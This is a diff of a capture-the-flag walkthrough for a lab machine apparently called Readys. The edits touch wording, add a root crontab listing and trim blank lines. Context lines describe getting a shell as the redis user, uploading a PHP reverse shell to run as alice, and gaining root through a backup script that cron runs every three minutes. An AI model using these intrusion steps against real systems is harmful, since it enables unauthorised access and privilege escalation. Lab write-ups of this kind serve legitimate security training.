@@ -76,8 +76,8 @@ $ penelope -p 22
 redis@readys:~$ id
 uid=107(redis) gid=114(redis) groups=114(redis)
 ```
-the wp is owned by alice  
-we just need to upload a reverse shell script and execute it as alice
+since wp is owned by alice  
+we just need to upload a reverse shell script and execute it as alice         
 create a script in redis which is own by current user
 ```console
 <?php
@@ -106,6 +106,10 @@ uid=1000(alice) gid=1000(alice) groups=1000(alice)
 ```
 ## Privilege Escalation
 there is a cronjob running by root every 3 minutes
+```console
+alice@readys:/var/www/html$ cat /etc/crontab
+*/3 * * * * root /usr/local/bin/backup.sh
+```
 ```console
 alice@readys:/var/www/html$ cat /usr/local/bin/backup.sh
 #!/bin/bash
@@ -142,19 +146,6 @@ $ penelope -p 80
 root@readys:/var/www/html# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 \
 
